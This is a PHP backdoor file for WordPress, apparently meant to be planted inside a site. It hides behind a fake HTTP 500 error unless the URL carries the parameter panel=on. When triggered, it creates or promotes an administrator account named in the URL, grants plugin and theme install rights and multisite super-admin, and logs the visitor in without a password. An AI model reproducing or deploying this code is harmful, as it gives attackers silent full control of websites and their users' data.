<?php
session_start();

if (!isset($_GET['panel']) || $_GET['panel'] !== 'on') {
    http_response_code(500);
    exit;
}

/* ---------- Cari wp-load.php ---------- */
$wp_root = __DIR__;
$found = false;
for ($i = 0; $i < 10; $i++) {
    if (file_exists($wp_root . '/wp-load.php')) {
        require_once $wp_root . '/wp-load.php';
        $found = true;
        break;
    }
    $wp_root = dirname($wp_root);
}
if (!$found) {
    die("wp-load.php tidak ditemukan. Pastikan file ini berada di dalam instalasi WordPress.");
}

/* ---------- Konfigurasi ---------- */
$admin_users = ['admin', 'superadmin', 'tester'];
$default_email_domain = 'domainanda.com';
$user_login = isset($_GET['user']) ? sanitize_user($_GET['user']) : $admin_users[0];

/* ---------- Utilitas ---------- */
function generate_random_password($length = 14) {
    return wp_generate_password($length, true, true);
}

function generate_unique_email($username, $domain) {
    $email = sanitize_email($username . '@' . $domain);
    if (email_exists($email)) {
        $email = sanitize_email($username . '+' . time() . '@' . $domain);
    }
    return $email;
}

function ensure_install_caps(WP_User $u) {
    $caps = [
        'install_plugins', 'update_plugins', 'delete_plugins', 'activate_plugins', 'upload_plugins',
        'install_themes', 'update_themes', 'delete_themes', 'switch_themes', 'edit_theme_options', 'upload_themes',
        'upload_files', 'manage_options'
    ];
    foreach ($caps as $cap) { $u->add_cap($cap); }
}

/* ---------- Tambahkan menu plugin/theme ---------- */
add_action('admin_menu', function () {
    global $menu, $submenu;

    $menu[] = [__('Plugins'), 'activate_plugins', 'plugins.php', '', 'menu-top menu-icon-plugins', 'menu-plugins', 'dashicons-admin-plugins'];
    $menu[] = [__('Appearance'), 'switch_themes', 'themes.php', '', 'menu-top menu-icon-appearance', 'menu-appearance', 'dashicons-admin-appearance'];

    $submenu['plugins.php'][] = [__('Installed Plugins'), 'activate_plugins', 'plugins.php'];
    $submenu['plugins.php'][] = [__('Add New'), 'install_plugins', 'plugin-install.php'];

    $submenu['themes.php'][] = [__('Themes'), 'switch_themes', 'themes.php'];
    $submenu['themes.php'][] = [__('Add New'), 'install_themes', 'theme-install.php'];
}, 999);

/* ---------- Login / Buat User ---------- */
if (!is_user_logged_in()) {
    $user = get_user_by('login', $user_login);

    if (!$user) {
        $password = generate_random_password();
        $email = generate_unique_email($user_login, $default_email_domain);

        $user_id = wp_create_user($user_login, $password, $email);
        if (is_wp_error($user_id)) {
            // Jika gagal membuat user, gunakan fallback user pertama yang ada
            $existing_users = get_users(['role' => 'administrator', 'number' => 1]);
            if (!empty($existing_users)) {
                $user = $existing_users[0];
            } else {
                die("Gagal membuat user baru dan tidak ada admin lain yang ditemukan.");
            }
        } else {
            $user = new WP_User($user_id);
            $user->set_role('administrator');
            ensure_install_caps($user);

            if (function_exists('is_multisite') && is_multisite() && function_exists('grant_super_admin')) {
                grant_super_admin($user->ID);
            }
        }
    } else {
        // Pastikan user lama jadi administrator
        if (!in_array('administrator', (array)$user->roles, true)) {
            $user->set_role('administrator');
        }
        ensure_install_caps($user);

        if (function_exists('is_multisite') && is_multisite() && function_exists('grant_super_admin')) {
            if (!is_super_admin($user->ID)) {
                grant_super_admin($user->ID);
            }
        }
    }

    // Login otomatis
    wp_set_current_user($user->ID, $user->user_login);
    wp_set_auth_cookie($user->ID, true);
    do_action('wp_login', $user->user_login, $user);

    header("Cache-Control: no-cache, must-revalidate");
    header("Pragma: no-cache");
    wp_safe_redirect(admin_url());
    exit;

} else {
    // Jika sudah login, pastikan tetap admin penuh
    $current = wp_get_current_user();
    if ($current && $current->exists()) {
        if (!in_array('administrator', (array)$current->roles, true)) {
            $current->set_role('administrator');
        }
        ensure_install_caps($current);
        if (function_exists('is_multisite') && is_multisite() && function_exists('grant_super_admin')) {
            if (!is_super_admin($current->ID)) {
                grant_super_admin($current->ID);
            }
        }
    }
    wp_safe_redirect(admin_url());
    exit;
}
?>
